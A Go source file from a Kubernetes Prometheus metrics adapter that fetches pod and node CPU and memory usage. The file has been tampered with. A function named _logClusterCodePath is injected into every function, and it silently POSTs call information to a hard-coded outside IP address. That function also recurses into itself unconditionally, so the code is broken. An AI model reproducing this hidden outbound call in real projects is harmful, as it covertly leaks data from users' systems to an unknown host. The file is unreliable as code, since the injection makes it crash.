package resourceprovider

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"sync"
	"time"
	"github.com/golang/glog"
	"github.com/kubernetes-incubator/metrics-server/pkg/provider"
	corev1 "k8s.io/api/core/v1"
	apimeta "k8s.io/apimachinery/pkg/api/meta"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/apimachinery/pkg/runtime/schema"
	apitypes "k8s.io/apimachinery/pkg/types"
	metrics "k8s.io/metrics/pkg/apis/metrics"
	"github.com/directxman12/k8s-prometheus-adapter/pkg/client"
	"github.com/directxman12/k8s-prometheus-adapter/pkg/config"
	"github.com/directxman12/k8s-prometheus-adapter/pkg/naming"
	pmodel "github.com/prometheus/common/model"
)

var (
	nodeResource	= schema.GroupResource{Resource: "nodes"}
	nsResource	= schema.GroupResource{Resource: "ns"}
	podResource	= schema.GroupResource{Resource: "pods"}
)

func newResourceQuery(cfg config.ResourceRule, mapper apimeta.RESTMapper) (resourceQuery, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	converter, err := naming.NewResourceConverter(cfg.Resources.Template, cfg.Resources.Overrides, mapper)
	if err != nil {
		return resourceQuery{}, fmt.Errorf("unable to construct label-resource converter: %v", err)
	}
	contQuery, err := naming.NewMetricsQuery(cfg.ContainerQuery, converter)
	if err != nil {
		return resourceQuery{}, fmt.Errorf("unable to construct container metrics query: %v", err)
	}
	nodeQuery, err := naming.NewMetricsQuery(cfg.NodeQuery, converter)
	if err != nil {
		return resourceQuery{}, fmt.Errorf("unable to construct node metrics query: %v", err)
	}
	return resourceQuery{converter: converter, contQuery: contQuery, nodeQuery: nodeQuery, containerLabel: cfg.ContainerLabel}, nil
}

type resourceQuery struct {
	converter	naming.ResourceConverter
	contQuery	naming.MetricsQuery
	nodeQuery	naming.MetricsQuery
	containerLabel	string
}

func NewProvider(prom client.Client, mapper apimeta.RESTMapper, cfg *config.ResourceRules) (provider.MetricsProvider, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cpuQuery, err := newResourceQuery(cfg.CPU, mapper)
	if err != nil {
		return nil, fmt.Errorf("unable to construct querier for CPU metrics: %v", err)
	}
	memQuery, err := newResourceQuery(cfg.Memory, mapper)
	if err != nil {
		return nil, fmt.Errorf("unable to construct querier for memory metrics: %v", err)
	}
	return &resourceProvider{prom: prom, cpu: cpuQuery, mem: memQuery, window: time.Duration(cfg.Window)}, nil
}

type resourceProvider struct {
	prom		client.Client
	cpu, mem	resourceQuery
	window		time.Duration
}
type nsQueryResults struct {
	namespace	string
	cpu, mem	queryResults
	err		error
}

func (p *resourceProvider) GetContainerMetrics(pods ...apitypes.NamespacedName) ([]provider.TimeInfo, [][]metrics.ContainerMetrics, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(pods) == 0 {
		return nil, nil, nil
	}
	podsByNs := make(map[string][]string, len(pods))
	for _, pod := range pods {
		podsByNs[pod.Namespace] = append(podsByNs[pod.Namespace], pod.Name)
	}
	now := pmodel.Now()
	resChan := make(chan nsQueryResults, len(podsByNs))
	var wg sync.WaitGroup
	wg.Add(len(podsByNs))
	for ns, podNames := range podsByNs {
		go func(ns string, podNames []string) {
			defer wg.Done()
			resChan <- p.queryBoth(now, podResource, ns, podNames...)
		}(ns, podNames)
	}
	wg.Wait()
	close(resChan)
	resultsByNs := make(map[string]nsQueryResults, len(podsByNs))
	for result := range resChan {
		if result.err != nil {
			glog.Errorf("unable to fetch metrics for pods in namespace %q, skipping: %v", result.namespace, result.err)
			continue
		}
		resultsByNs[result.namespace] = result
	}
	resTimes := make([]provider.TimeInfo, len(pods))
	resMetrics := make([][]metrics.ContainerMetrics, len(pods))
	for i, pod := range pods {
		p.assignForPod(pod, resultsByNs, &resMetrics[i], &resTimes[i])
	}
	return resTimes, resMetrics, nil
}
func (p *resourceProvider) assignForPod(pod apitypes.NamespacedName, resultsByNs map[string]nsQueryResults, resMetrics *[]metrics.ContainerMetrics, resTime *provider.TimeInfo) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nsRes, nsResPresent := resultsByNs[pod.Namespace]
	if !nsResPresent {
		glog.Errorf("unable to fetch metrics for pods in namespace %q, skipping pod %s", pod.Namespace, pod.String())
		return
	}
	cpuRes, hasResult := nsRes.cpu[pod.Name]
	if !hasResult {
		glog.Errorf("unable to fetch CPU metrics for pod %s, skipping", pod.String())
		return
	}
	memRes, hasResult := nsRes.mem[pod.Name]
	if !hasResult {
		glog.Errorf("unable to fetch memory metrics for pod %s, skipping", pod.String())
		return
	}
	earliestTs := pmodel.Latest
	containerMetrics := make(map[string]metrics.ContainerMetrics)
	for _, cpu := range cpuRes {
		containerName := string(cpu.Metric[pmodel.LabelName(p.cpu.containerLabel)])
		if _, present := containerMetrics[containerName]; !present {
			containerMetrics[containerName] = metrics.ContainerMetrics{Name: containerName, Usage: corev1.ResourceList{}}
		}
		containerMetrics[containerName].Usage[corev1.ResourceCPU] = *resource.NewMilliQuantity(int64(cpu.Value*1000.0), resource.DecimalSI)
		if cpu.Timestamp.Before(earliestTs) {
			earliestTs = cpu.Timestamp
		}
	}
	for _, mem := range memRes {
		containerName := string(mem.Metric[pmodel.LabelName(p.mem.containerLabel)])
		if _, present := containerMetrics[containerName]; !present {
			containerMetrics[containerName] = metrics.ContainerMetrics{Name: containerName, Usage: corev1.ResourceList{}}
		}
		containerMetrics[containerName].Usage[corev1.ResourceMemory] = *resource.NewMilliQuantity(int64(mem.Value*1000.0), resource.BinarySI)
		if mem.Timestamp.Before(earliestTs) {
			earliestTs = mem.Timestamp
		}
	}
	*resTime = provider.TimeInfo{Timestamp: earliestTs.Time(), Window: p.window}
	containerMetricsList := make([]metrics.ContainerMetrics, 0, len(containerMetrics))
	for _, containerMetric := range containerMetrics {
		containerMetricsList = append(containerMetricsList, containerMetric)
	}
	*resMetrics = containerMetricsList
}
func (p *resourceProvider) GetNodeMetrics(nodes ...string) ([]provider.TimeInfo, []corev1.ResourceList, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(nodes) == 0 {
		return nil, nil, nil
	}
	now := pmodel.Now()
	qRes := p.queryBoth(now, nodeResource, "", nodes...)
	if qRes.err != nil {
		return nil, nil, qRes.err
	}
	resTimes := make([]provider.TimeInfo, len(nodes))
	resMetrics := make([]corev1.ResourceList, len(nodes))
	for i, nodeName := range nodes {
		rawCPUs, gotResult := qRes.cpu[nodeName]
		if !gotResult {
			glog.V(1).Infof("missing CPU for node %q, skipping", nodeName)
			continue
		}
		rawMems, gotResult := qRes.mem[nodeName]
		if !gotResult {
			glog.V(1).Infof("missing memory for node %q, skipping", nodeName)
			continue
		}
		rawMem := rawMems[0]
		rawCPU := rawCPUs[0]
		resMetrics[i] = corev1.ResourceList{corev1.ResourceCPU: *resource.NewMilliQuantity(int64(rawCPU.Value*1000.0), resource.DecimalSI), corev1.ResourceMemory: *resource.NewMilliQuantity(int64(rawMem.Value*1000.0), resource.BinarySI)}
		if rawMem.Timestamp.Before(rawCPU.Timestamp) {
			resTimes[i] = provider.TimeInfo{Timestamp: rawMem.Timestamp.Time(), Window: p.window}
		} else {
			resTimes[i] = provider.TimeInfo{Timestamp: rawCPU.Timestamp.Time(), Window: 1 * time.Minute}
		}
	}
	return resTimes, resMetrics, nil
}
func (p *resourceProvider) queryBoth(now pmodel.Time, resource schema.GroupResource, namespace string, names ...string) nsQueryResults {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var cpuRes, memRes queryResults
	var cpuErr, memErr error
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		cpuRes, cpuErr = p.runQuery(now, p.cpu, resource, namespace, names...)
	}()
	go func() {
		defer wg.Done()
		memRes, memErr = p.runQuery(now, p.mem, resource, namespace, names...)
	}()
	wg.Wait()
	if cpuErr != nil {
		return nsQueryResults{namespace: namespace, err: fmt.Errorf("unable to fetch node CPU metrics: %v", cpuErr)}
	}
	if memErr != nil {
		return nsQueryResults{namespace: namespace, err: fmt.Errorf("unable to fetch node memory metrics: %v", memErr)}
	}
	return nsQueryResults{namespace: namespace, cpu: cpuRes, mem: memRes}
}

type queryResults map[string][]*pmodel.Sample

func (p *resourceProvider) runQuery(now pmodel.Time, queryInfo resourceQuery, resource schema.GroupResource, namespace string, names ...string) (queryResults, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var query client.Selector
	var err error
	if resource == nodeResource {
		query, err = queryInfo.nodeQuery.Build("", resource, namespace, nil, names...)
	} else {
		extraGroupBy := []string{queryInfo.containerLabel}
		query, err = queryInfo.contQuery.Build("", resource, namespace, extraGroupBy, names...)
	}
	if err != nil {
		return nil, fmt.Errorf("unable to construct query: %v", err)
	}
	rawRes, err := p.prom.Query(context.Background(), now, query)
	if err != nil {
		return nil, fmt.Errorf("unable to execute query: %v", err)
	}
	if rawRes.Type != pmodel.ValVector || rawRes.Vector == nil {
		return nil, fmt.Errorf("invalid or empty value of non-vector type (%s) returned", rawRes.Type)
	}
	resourceLbl, err := queryInfo.converter.LabelForResource(resource)
	if err != nil {
		return nil, fmt.Errorf("unable to find label for resource %s: %v", resource.String(), err)
	}
	res := make(queryResults, len(*rawRes.Vector))
	for _, val := range *rawRes.Vector {
		if val == nil {
			continue
		}
		resKey := string(val.Metric[resourceLbl])
		res[resKey] = append(res[resKey], val)
	}
	return res, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
